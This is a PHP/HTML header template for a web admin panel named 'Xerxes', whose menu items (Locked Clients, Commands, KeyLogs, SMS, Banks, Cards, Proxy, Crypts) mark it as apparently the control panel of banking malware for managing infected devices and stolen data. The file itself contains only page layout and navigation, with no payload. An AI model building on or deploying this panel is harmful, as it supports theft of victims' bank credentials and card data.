<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="description" content="">
        <meta name="author" content="">

        <title>Xerxes</title>

        <!-- Bootstrap Core CSS -->
        <link  rel="stylesheet" href="css/bootstrap.min.css"/>

        <!-- MetisMenu CSS -->
        <link href="js/metisMenu/metisMenu.min.css" rel="stylesheet">

        <!-- Custom CSS -->
        <link href="css/sb-admin-2.css" rel="stylesheet">
        <!-- Custom Fonts -->
        <link href="fonts/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->
        <script src="js/jquery.min.js" type="text/javascript"></script>
        <script src="js/support.js" type="text/javascript"></script>
    </head>

    <body>
        <div id="wrapper">
            <!-- Navigation -->
            <?php if (isset($_SESSION['user_logged_in']) && $_SESSION['user_logged_in'] == true ) : ?>
                <nav class="navbar navbar-inverse navbar-static-top" role="navigation" style="margin-bottom: 0">

                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <a class="navbar-brand" href="index.php">Xerxes</a>
                    </div>

                    <!-- /.navbar-header -->
                    <div class="navbar-nav-scroll">
                        <ul class="nav navbar-nav" id="side-menu">
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/index.php")) echo "class=\"active\"" ?>>
                                <a href="index.php"><i class="fa fa-dashboard fa-fw"></i> Dashboard</a>
                            </li>

                            <!--<li class="">
                                <a href="#"><i class="fa fa-user-circle fa-fw"></i> Customers<span class="fa arrow"></span></a>
                                <ul class="nav nav-second-level">
                                    <li>
                                        <a href="customers.php"><i class="fa fa-list fa-fw"></i>List all</a>
                                    </li>
                                <li>
                                    <a href="add_customer.php"><i class="fa fa-plus fa-fw"></i>Add New</a>
                                </li>
                                </ul>
                            </li>-->
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/clients.php")) echo "class=\"active\"" ?>>
                                <a href="clients.php"><i class="fa fa-users"></i> Clients</a>
                            </li>
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/locked_clients.php")) echo "class=\"active\"" ?>>
                                <a href="locked_clients.php"><i class="glyphicon glyphicon-lock"></i> Locked Clients</a>
                            </li>
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/commands.php")) echo "class=\"active\"" ?>>
                                <a href="commands.php"><i class="fa fa-terminal"></i> Commands</a>
                            </li>
                            <!--<li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/contacts.php")) echo "class=\"active\"" ?>>
                                <a href="contacts.php"><i class="fa fa-user-secret"></i> Contacts</a>
                            </li>
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/list_")) echo "class=\"active\"" ?>>
                                <a href="#"><i class="fa fa-list fa-fw"></i> Logs<span class="fa arrow"></span></a>
                                <ul class="nav nav-second-level">
                                    <li>
                                        <a href="list_log.php"><i class="fa fa-list"></i> Logs</a>
                                    </li>
                                    <li>
                                        <a href="list_keylog.php"><i class="fa fa-list"></i> KeyLogs</a>
                                    </li>
                                    <li>
                                        <a href="list_sms.php"><i class="fa fa-list"></i> SMS</a>
                                    </li>
                                    <li>
                                        <a href="list_banks.php"><i class="fa fa-list"></i> Banks</a>
                                    </li>
                                    <li>
                                        <a href="list_cc.php"><i class="fa fa-list"></i> Cards</a>
                                    </li>
                                </ul>
                            </li>-->
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/list_log.php")) echo "class=\"active\"" ?>>
                                <a href="list_log.php"><i class="fa fa-users"></i> Logs</a>
                            </li>
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/list_sms.php")) echo "class=\"active\"" ?>>
                                <a href="list_sms.php"><i class="fa fa-users"></i> SMS</a>
                            </li>
                           <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/list_banks.php")) echo "class=\"active\"" ?>>
                                <a href="list_banks.php"><i class="fa fa-users"></i> Banks</a>
                            </li>
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/list_cc.php")) echo "class=\"active\"" ?>>
                                <a href="list_cc.php"><i class="fa fa-users"></i> Cards</a>
                            </li>


                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/admin_users.php")) echo "class=\"active\"" ?>>
                                <a href="admin_users.php"><i class="fa fa-users"></i> Users</a>
                            </li>
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/proxy.php")) echo "class=\"active\"" ?>>
                                <a href="proxy.php"><i class="glyphicon glyphicon-link"></i> Proxy</a>
                            </li>
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/settings.php")) echo "class=\"active\"" ?>>
                                <a href="settings.php"><i class="glyphicon glyphicon-cog"></i> Settings</a>
                            </li>
                            <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/help.php")) echo "class=\"active\"" ?>>
                                <a href="help.php"><i class="glyphicon glyphicon-exclamation-sign"></i> Help</a>
                            </li>
                               <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/crypt.php")) echo "class=\"active\"" ?>>
                                <a href="crypt.php"><i class="glyphicon glyphicon-exclamation-sign"></i> Сrypts</a>
                            </li>
                              <li <?php if (substr_count($_SERVER['SCRIPT_NAME'], "/Contacts.php")) echo "class=\"active\"" ?>>
                                <a href="Contacts.php"><i class="glyphicon glyphicon-exclamation-sign"></i> Contacts</a>
                            </li>
                        </ul>
                    </div>

                    <ul class="nav navbar-top-links navbar-right">
                        <!-- /.dropdown -->

                        <!-- /.dropdown -->
                        <li class="dropdown">
                            <a class="dropdown-toggle" data-toggle="dropdown" href="#">
                                <i class="fa fa-user fa-fw"></i> <i class="fa fa-caret-down"></i>
                            </a>
                            <ul class="dropdown-menu dropdown-user">
                                <!--<li><a href="#"><i class="fa fa-user fa-fw"></i> User Profile</a>
                                </li>
                                <li><a href="#"><i class="fa fa-gear fa-fw"></i> Settings</a>
                                </li>
                                <li class="divider"></li>-->
                                <li><a href="logout.php"><i class="fa fa-sign-out fa-fw"></i> Logout</a>
                                </li>
                            </ul>
                            <!-- /.dropdown-user -->
                        </li>
                        <!-- /.dropdown -->
                    </ul>
                    <!-- /.navbar-top-links -->
                </nav>
            <?php endif; ?>
            <!-- The End of the Header -->
